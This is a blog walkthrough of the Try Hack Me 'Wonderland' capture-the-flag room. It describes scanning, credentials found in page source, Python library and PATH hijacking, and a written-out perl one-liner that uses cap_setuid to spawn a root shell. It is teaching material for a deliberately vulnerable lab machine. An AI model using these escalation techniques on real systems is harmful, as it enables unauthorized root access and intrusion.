---
layout: post
title: "Wonderland: Try Hack Me Walkthrough"
date: 2020-06-05 20:20:20 +0000
last_modified_at: 2020-06-05 20:20:20 +0000
category: Walkthrough
tags: ["Try Hack Me", Wonderland, Weekly Challenge, Web]
comments: true
image:
  feature: WonderLand/WonderlandFeature_ue4mbd.jpg
  credit: WallpaperCave / WallpaperCave
  creditlink: https://wallpapercave.com/w/wp4684154
---

This post documents the complete walkthrough of Wonderland, a weekly vulnerable challenge [VM][1] created by [NinjaJc01][2], and hosted at [Try Hack Me][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Wonderland is a weekly challenge vulnerable VM from Try Hack Me.

## Information Gathering

Let’s start with a `nmap` scan to establish the open ports in the host.

```
# nmap -vv --reason -Pn -sV -sC --version-all -oN /root/Desktop/THM/Wonderland/scans/tcp_nmap.txt 10.10.200.195
...
Nmap scan report for 10.10.200.195
Host is up, received user-set (0.098s latency).
Scanned at 2020-06-05 17:29:02 EDT for 20s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Website Analysis

Appears to be some kind of `http` service. Here's how it looks like.

{% include image.html image_alt="WonderLand/WonderlandFirstPage_elolsj.jpg" image_src="WonderLand/WonderlandFirstPage_elolsj.jpg" %}

First things first we do a `gobuster` scan.

```
gobuster dir -u http://10.10.200.195 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

Once the scan returns we see one result.

{% include image.html image_alt="WonderLand/WonderlandFirstDirb_q46f3m.jpg" image_src="WonderLand/WonderlandFirstDirb_q46f3m.jpg" %}

Going to that page we view the source of the page. We see a comment about following the rabbit.

{% include image.html image_alt="WonderLand/WonderlandFirstPage_elolsj.jpg" image_src="WonderLand/WonderlandFirstPage_elolsj.jpg" %}

We run another `gobuster` from this new directory. This will hopefully show us more of the path.

```
gobuster dir -u http://10.10.200.195/r/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

It looks like the scan returns a new directory from this path.

{% include image.html image_alt="WonderLand/WonderlandDirb2_hunewl.jpg" image_src="WonderLand/WonderlandDirb2_hunewl.jpg" %}

Viewing that page returned the same message as before... we try going to /r/a/b/b/i/t

{% include image.html image_alt="WonderLand/WonderLandNewPage_j8nsqk.jpg" image_src="WonderLand/WonderLandNewPage_j8nsqk.jpg" %}

We view the source of this page and it gives us what looks to be some login credentials.

{% include image.html image_alt="WonderLand/WonderLandAliceCreds_xenhos.jpg" image_src="WonderLand/WonderLandAliceCreds_xenhos.jpg" %}

## Exploiting the Box

### Getting `user.txt`

#### Getting Rabbit

```
ssh alice@10.10.200.195
```

Since we have the alice password. We run a sudo -l to see if we can run any commands on the box.

{% include image.html image_alt="WonderLand/WonderlandAliceSudo_d5tisn.jpg" image_src="WonderLand/WonderlandAliceSudo_d5tisn.jpg" %}

We see we can run python3.6 as rabbit with a certain python script. We also see in the script it imports random. We can do something called python library hijacking. If we place a random.py file in the same directory when import random runs it will use our python file instead of the random.py library python file.

{% include image.html image_alt="WonderLand/WonderLandAlicePython_gxrxbe.jpg" image_src="WonderLand/WonderLandAlicePython_gxrxbe.jpg" %}


```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 

```

{% include image.html image_alt="WonderLand/wonderlandrabbitstart_xpwq91.jpg" image_src="WonderLand/wonderlandrabbitstart_xpwq91.jpg" %}

#### Getting madhatter

Now we move over to /home/rabbit. We see a binary called teaTime. When we run it the binary shows the following display.

{% include image.html image_alt="WonderLand/wonderlandrabbitteaparty_ljq5f2.jpg" image_src="WonderLand/wonderlandrabbitteaparty_ljq5f2.jpg" %}

I copied the file back to our system by running: `python3 -m http.server`. We then strings the file on our system and notice it calls date without specifying the path. This means we hijack the path and take over the date binary.

{% include image.html image_alt="WonderLand/WonderlandRabbitStrings_fnnlx3.jpg" image_src="WonderLand/WonderlandRabbitStrings_fnnlx3.jpg" %}

We create the following file with `Vi` on the system as rabbit and do `chmod +x date` on our new file.

{% include image.html image_alt="WonderLand/WonderLandDate_upmv72.jpg" image_src="WonderLand/WonderLandDate_upmv72.jpg" %}

We then change our path by doing `export PATH=/home/rabbit:$PATH` and run the `teaParty` 

{% include image.html image_alt="WonderLand/WonderlandHatterInit_xt813h.jpg" image_src="WonderLand/WonderlandHatterInit_xt813h.jpg" %}

### Getting `root.txt`

We do our standard enumeration using `linpeas` and see that `/usr/bin/perl` has cap_setuid+ep capabilities 

{% include image.html image_alt="WonderLand/WonderLandEnum_oyo70g.jpg" image_src="WonderLand/WonderLandEnum_oyo70g.jpg" %}

```
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Running this gives us root as perl as setuid privileges so it can execute /bin/bash as root

{% include image.html image_alt="WonderLand/WonderLandRoot_hxhyj2.jpg" image_src="WonderLand/WonderLandRoot_hxhyj2.jpg" %}

Doing this we see our root.txt flag in the Alice directory!

{% include image.html image_alt="WonderLand/WonderlandRootFlag_thkrtu.jpg" image_src="WonderLand/WonderlandRootFlag_thkrtu.jpg" %}

We also can navigate to /root and get our user.txt flag.

{% include image.html image_alt="WonderLand/WonderLandUser_gnpd6i.jpg" image_src="WonderLand/WonderLandUser_gnpd6i.jpg" %}

:dancer:

[1]: https://tryhackme.com/room/wonderland
[2]: https://tryhackme.com/p/NinjaJc01
[3]: https://tryhackme.com
